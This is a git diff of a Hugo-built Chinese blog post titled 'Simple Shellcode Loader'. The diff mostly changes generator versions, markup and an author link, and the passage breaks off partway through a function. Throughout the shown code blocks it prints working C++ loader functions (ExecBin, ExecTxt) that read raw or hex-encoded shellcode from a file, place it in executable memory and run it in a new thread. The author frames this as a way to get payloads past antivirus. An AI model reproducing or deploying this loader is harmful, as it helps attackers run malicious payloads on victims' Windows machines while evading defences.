@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="generator" content="Hugo 0.88.1" />
+  <meta name="generator" content="Hugo 0.100.1" />
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -21,7 +21,7 @@
       "articleSection" : "posts",
       "name" : "Simple Shellcode Loader",
       "headline" : "Simple Shellcode Loader",
-      "description" : "前言 之前的东西，加了个功能又学到了新东西，练下代码；\n这一篇都非常简单！！！这垃圾代码再改改，硬编码下字符串、隐藏下WinAPI等，肯定效果很更好点。\n开冲 就是简单的三部曲\n 申请内存 写入内存 然后加载  VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..\nExecBin 这个就比较简单了，\n1. 从文件中读取 2. 然后拷贝进内存 3. 创建线程加载 void ExecBin(char* file_name) { DWORD two; LARGE_INTEGER fileSize; HANDLE hThread; DWORD dwThreadId; char* filename = file_name; HANDLE MyFile = CreateFileA(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); GetFileSizeEx(MyFile, \u0026amp;fileSize); char buf[6000]; ZeroMemory(\u0026amp;buf, sizeof(buf)); printf(\u0026#34;Size : %d \\n\u0026#34;, fileSize.LowPart); char *xue_buf = (char*)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); ReadFile(MyFile, buf, fileSize.",
+      "description" : "前言 之前的东西，加了个功能又学到了新东西，练下代码；\n这一篇都非常简单！！！这垃圾代码再改改，硬编码下字符串、隐藏下WinAPI等，肯定效果很更好点。\n开冲 就是简单的三部曲\n申请内存 写入内存 然后加载 VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..\nExecBin 这个就比较简单了，\n1. 从文件中读取 2. 然后拷贝进内存 3. 创建线程加载 void ExecBin(char* file_name) { DWORD two; LARGE_INTEGER fileSize; HANDLE hThread; DWORD dwThreadId; char* filename = file_name; HANDLE MyFile = CreateFileA(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); GetFileSizeEx(MyFile, \u0026amp;fileSize); char buf[6000]; ZeroMemory(\u0026amp;buf, sizeof(buf)); printf(\u0026#34;Size : %d \\n\u0026#34;, fileSize.LowPart); char *xue_buf = (char*)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); ReadFile(MyFile, buf, fileSize.",
       "inLanguage" : "en-US",
       "author" : "Muxue",
       "creator" : "Muxue",
@@ -41,13 +41,13 @@
   <meta property="og:description" content="前言 之前的东西，加了个功能又学到了新东西，练下代码；
 这一篇都非常简单！！！这垃圾代码再改改，硬编码下字符串、隐藏下WinAPI等，肯定效果很更好点。
 开冲 就是简单的三部曲
- 申请内存 写入内存 然后加载  VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..
+申请内存 写入内存 然后加载 VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..
 ExecBin 这个就比较简单了，
 1. 从文件中读取 2. 然后拷贝进内存 3. 创建线程加载 void ExecBin(char* file_name) { DWORD two; LARGE_INTEGER fileSize; HANDLE hThread; DWORD dwThreadId; char* filename = file_name; HANDLE MyFile = CreateFileA(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); GetFileSizeEx(MyFile, &amp;amp;fileSize); char buf[6000]; ZeroMemory(&amp;amp;buf, sizeof(buf)); printf(&amp;#34;Size : %d \n&amp;#34;, fileSize.LowPart); char *xue_buf = (char*)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); ReadFile(MyFile, buf, fileSize." />
   <meta name="description" content="前言 之前的东西，加了个功能又学到了新东西，练下代码；
 这一篇都非常简单！！！这垃圾代码再改改，硬编码下字符串、隐藏下WinAPI等，肯定效果很更好点。
 开冲 就是简单的三部曲
- 申请内存 写入内存 然后加载  VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..
+申请内存 写入内存 然后加载 VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..
 ExecBin 这个就比较简单了，
 1. 从文件中读取 2. 然后拷贝进内存 3. 创建线程加载 void ExecBin(char* file_name) { DWORD two; LARGE_INTEGER fileSize; HANDLE hThread; DWORD dwThreadId; char* filename = file_name; HANDLE MyFile = CreateFileA(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); GetFileSizeEx(MyFile, &amp;amp;fileSize); char buf[6000]; ZeroMemory(&amp;amp;buf, sizeof(buf)); printf(&amp;#34;Size : %d \n&amp;#34;, fileSize.LowPart); char *xue_buf = (char*)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); ReadFile(MyFile, buf, fileSize." />
   <meta property="og:locale" content="en-us" />
@@ -119,7 +119,7 @@ ExecBin 这个就比较简单了，
             <div class="col-xs-6">
               
               <div class="post-author">
-                <a target="_blank" href="https://github.com/muxue">@Muxue</a>
+                <a target="_blank" href="https://github.com/secxue">@Muxue</a>
               </div>
               
             </div>
@@ -139,41 +139,41 @@ ExecBin 这个就比较简单了，
 <li>写入内存</li>
 <li>然后加载</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">VirtualAlloc() or VirtualAllocEx();
-CopyMemory() or WriteMemory();
-CreateThread() or (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)()) shellcode)();;
-</code></pre></div><p>还有很多类似的这种..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>VirtualAlloc() or VirtualAllocEx();
+</span></span><span style="display:flex;"><span>CopyMemory() or WriteMemory();
+</span></span><span style="display:flex;"><span>CreateThread() or (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)()) shellcode)();;
+</span></span></code></pre></div><p>还有很多类似的这种..</p>
 <h2 id="execbin">ExecBin</h2>
 <p>这个就比较简单了，</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">1. 从文件中读取
-2. 然后拷贝进内存
-3. 创建线程加载
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ExecBin</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> file_name) {
-	DWORD two;
-	LARGE_INTEGER fileSize;
-	HANDLE hThread;
-	DWORD dwThreadId;
-	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> file_name;
-
-	HANDLE MyFile <span style="color:#f92672">=</span> CreateFileA(file_name, GENERIC_READ, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	GetFileSizeEx(MyFile, <span style="color:#f92672">&amp;</span>fileSize);
-	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">6000</span>];
-	ZeroMemory(<span style="color:#f92672">&amp;</span>buf, <span style="color:#66d9ef">sizeof</span>(buf));
-	printf(<span style="color:#e6db74">&#34;Size : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fileSize.LowPart);
-	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xue_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-	ReadFile(MyFile, buf, fileSize.LowPart, <span style="color:#f92672">&amp;</span>two, NULL);
-	CopyMemory(xue_buf, buf, <span style="color:#66d9ef">sizeof</span>(buf));
-
-	hThread <span style="color:#f92672">=</span> CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)xue_buf, NULL, NULL, <span style="color:#f92672">&amp;</span>dwThreadId);
-
-	<span style="color:#75715e">// 等待线程
-</span><span style="color:#75715e"></span>	WaitForSingleObject(hThread, INFINITE); <span style="color:#75715e">// 一直等待线程执行结束
-</span><span style="color:#75715e"></span>	VirtualFree(xue_buf, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
-	CloseHandle(MyFile);
-	CloseHandle(hThread);
-}
-</code></pre></div><p>通过ReadFIle读取二进制文件，放入到一个变量中，最后把这个变量CopyMemory拷贝进一块内存中，最后加载执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1. 从文件中读取
+</span></span><span style="display:flex;"><span>2. 然后拷贝进内存
+</span></span><span style="display:flex;"><span>3. 创建线程加载
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ExecBin</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> file_name) {
+</span></span><span style="display:flex;"><span>	DWORD two;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER fileSize;
+</span></span><span style="display:flex;"><span>	HANDLE hThread;
+</span></span><span style="display:flex;"><span>	DWORD dwThreadId;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> file_name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE MyFile <span style="color:#f92672">=</span> CreateFileA(file_name, GENERIC_READ, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>	GetFileSizeEx(MyFile, <span style="color:#f92672">&amp;</span>fileSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">6000</span>];
+</span></span><span style="display:flex;"><span>	ZeroMemory(<span style="color:#f92672">&amp;</span>buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;Size : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fileSize.LowPart);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xue_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ReadFile(MyFile, buf, fileSize.LowPart, <span style="color:#f92672">&amp;</span>two, NULL);
+</span></span><span style="display:flex;"><span>	CopyMemory(xue_buf, buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hThread <span style="color:#f92672">=</span> CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)xue_buf, NULL, NULL, <span style="color:#f92672">&amp;</span>dwThreadId);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 等待线程
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WaitForSingleObject(hThread, INFINITE); <span style="color:#75715e">// 一直等待线程执行结束
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	VirtualFree(xue_buf, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+</span></span><span style="display:flex;"><span>	CloseHandle(MyFile);
+</span></span><span style="display:flex;"><span>	CloseHandle(hThread);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过ReadFIle读取二进制文件，放入到一个变量中，最后把这个变量CopyMemory拷贝进一块内存中，最后加载执行。</p>
 <p><img src="/images/Simple-Shellcode-Loader/image-20211004141011155.png" alt="image-20211004141011155"></p>
 <h2 id="exectxt">ExecTxt</h2>
 <p>像那种原始的shellcode payload，直接整进内存再加载，极为方便所以一些AV看的就比较严了。</p>
@@ -182,11 +182,11 @@ CreateThread() or (<span style="color:#f92672">*</span>(<span style="color:#66d9
 <p>借鉴于这个项目：https://github.com/DimopoulosElias/SimpleShellcodeInjector</p>
 <p><img src="/images/Simple-Shellcode-Loader/image-20211004142034146.png" alt="image-20211004142034146"></p>
 <p>想要弄明白就调试一下，我直接用的@idiotc4t师傅的demo来做测试了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span> iterations<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">++</span>) {
-        sscanf(shellcode<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>i, <span style="color:#e6db74">&#34;%2X&#34;</span>, <span style="color:#f92672">&amp;</span>char_in_hex);		<span style="color:#75715e">// sscanf格式化输出，%2x以十六进制输出保留两位(应该就是取两位)，然后传入char_in_hex里
-</span><span style="color:#75715e"></span>        shellcode[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)char_in_hex;
-    }
-</code></pre></div><p>首先看没有转换的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span> iterations<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        sscanf(shellcode<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>i, <span style="color:#e6db74">&#34;%2X&#34;</span>, <span style="color:#f92672">&amp;</span>char_in_hex);		<span style="color:#75715e">// sscanf格式化输出，%2x以十六进制输出保留两位(应该就是取两位)，然后传入char_in_hex里
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        shellcode[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)char_in_hex;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>首先看没有转换的</p>
 <p><img src="/images/Simple-Shellcode-Loader/image-20211004142454647.png" alt="image-20211004142454647"></p>
 <p>可以从内存窗口看出就是<strong>单纯的字符串</strong>，要是拷贝进内存中，拷贝进去的不是shellcode而是这些字符串！这是踩了个坑 基础太差</p>
 <p>然后接着跟进</p>
@@ -215,63 +215,63 @@ CreateThread() or (<span style="color:#f92672">*</span>(<span style="color:#66d9
 <blockquote>
 <p>这样shellcode就正常在内存中了</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
-	<span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> char_in_hex;									<span style="color:#75715e">// 临时变量
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> iterations <span style="color:#f92672">=</span> strlen(shellcode);				<span style="color:#75715e">// 整体shellcode的长度
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> memory_allocation <span style="color:#f92672">=</span> strlen(shellcode) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> ;	<span style="color:#75715e">// 因为在内存中俩个为1byte吗 除2
-</span><span style="color:#75715e"></span>
-    DWORD temp;
-	LARGE_INTEGER fileSize;
-	HANDLE hThread;
-	DWORD dwThreadId;
-    
-	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xue_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)VirtualAlloc(NULL, memory_allocation, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> iterations <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) { <span style="color:#75715e">//减小开销
-</span><span style="color:#75715e"></span>        sscanf_s(shellcode <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i, <span style="color:#e6db74">&#34;%2X&#34;</span>, <span style="color:#f92672">&amp;</span>char_in_hex);
-        shellcode[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)char_in_hex;
-    }
-
-	CopyMemory(xue_buf, shellcode, memory_allocation);
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-}
-</code></pre></div><p>这样一搞明白ExecTxt这个函数的原理就很简单了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ExecTxt</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> file_name) {
-	DWORD two;
-	LARGE_INTEGER fileSize;
-	HANDLE hThread;
-	DWORD dwThreadId;
-	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> file_name;
-	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> char_in_hex;
-	
-	HANDLE MyFile <span style="color:#f92672">=</span> CreateFileA(file_name, GENERIC_READ, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	GetFileSizeEx(MyFile, <span style="color:#f92672">&amp;</span>fileSize);
-	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">6000</span>];
-	ZeroMemory(<span style="color:#f92672">&amp;</span>buf, <span style="color:#66d9ef">sizeof</span>(buf));
-	printf(<span style="color:#e6db74">&#34;Size : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fileSize.LowPart);
-	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xue_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-	ReadFile(MyFile, buf, fileSize.LowPart, <span style="color:#f92672">&amp;</span>two, NULL);
-	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> iterations <span style="color:#f92672">=</span> strlen(buf);
-	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> iterations <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) { <span style="color:#75715e">//减小开销
-</span><span style="color:#75715e"></span>		sscanf_s(buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i, <span style="color:#e6db74">&#34;%2X&#34;</span>, <span style="color:#f92672">&amp;</span>char_in_hex);
-		buf[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)char_in_hex;
-	}
-	CopyMemory(xue_buf, buf, <span style="color:#66d9ef">sizeof</span>(buf));
-	<span style="color:#75715e">// printf(xue_buf);
-</span><span style="color:#75715e"></span>
-	hThread <span style="color:#f92672">=</span> CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)xue_buf,NULL,NULL,<span style="color:#f92672">&amp;</span>dwThreadId);
-	<span style="color:#75715e">// 等待线程
-</span><span style="color:#75715e"></span>	WaitForSingleObject(hThread, INFINITE);
-	VirtualFree(xue_buf, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
-	CloseHandle(MyFile);
-	CloseHandle(hThread);
-}
-</code></pre></div><p>就是把\x or 0x删除(这个功能我没写 我直接从就删除了然后到txt里)，申请块内存，通过ReadFIle读取进来，然后把对应的字符串的16进制数据重新写入<code>xue_buf</code>里，最后CopyMemory拷贝进内存，CreateThread加载。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> char_in_hex;									<span style="color:#75715e">// 临时变量
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> iterations <span style="color:#f92672">=</span> strlen(shellcode);				<span style="color:#75715e">// 整体shellcode的长度
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> memory_allocation <span style="color:#f92672">=</span> strlen(shellcode) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> ;	<span style="color:#75715e">// 因为在内存中俩个为1byte吗 除2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    DWORD temp;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER fileSize;
+</span></span><span style="display:flex;"><span>	HANDLE hThread;
+</span></span><span style="display:flex;"><span>	DWORD dwThreadId;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xue_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)VirtualAlloc(NULL, memory_allocation, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> iterations <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) { <span style="color:#75715e">//减小开销
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        sscanf_s(shellcode <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i, <span style="color:#e6db74">&#34;%2X&#34;</span>, <span style="color:#f92672">&amp;</span>char_in_hex);
+</span></span><span style="display:flex;"><span>        shellcode[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)char_in_hex;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	CopyMemory(xue_buf, shellcode, memory_allocation);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这样一搞明白ExecTxt这个函数的原理就很简单了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ExecTxt</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> file_name) {
+</span></span><span style="display:flex;"><span>	DWORD two;
+</span></span><span style="display:flex;"><span>	LARGE_INTEGER fileSize;
+</span></span><span style="display:flex;"><span>	HANDLE hThread;
+</span></span><span style="display:flex;"><span>	DWORD dwThreadId;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> filename <span style="color:#f92672">=</span> file_name;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> char_in_hex;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	HANDLE MyFile <span style="color:#f92672">=</span> CreateFileA(file_name, GENERIC_READ, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>	GetFileSizeEx(MyFile, <span style="color:#f92672">&amp;</span>fileSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">6000</span>];
+</span></span><span style="display:flex;"><span>	ZeroMemory(<span style="color:#f92672">&amp;</span>buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;Size : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fileSize.LowPart);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>xue_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)VirtualAlloc(NULL, <span style="color:#66d9ef">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ReadFile(MyFile, buf, fileSize.LowPart, <span style="color:#f92672">&amp;</span>two, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> iterations <span style="color:#f92672">=</span> strlen(buf);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> iterations <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>) { <span style="color:#75715e">//减小开销
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		sscanf_s(buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i, <span style="color:#e6db74">&#34;%2X&#34;</span>, <span style="color:#f92672">&amp;</span>char_in_hex);
+</span></span><span style="display:flex;"><span>		buf[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)char_in_hex;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	CopyMemory(xue_buf, buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// printf(xue_buf);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	hThread <span style="color:#f92672">=</span> CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)xue_buf,NULL,NULL,<span style="color:#f92672">&amp;</span>dwThreadId);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 等待线程
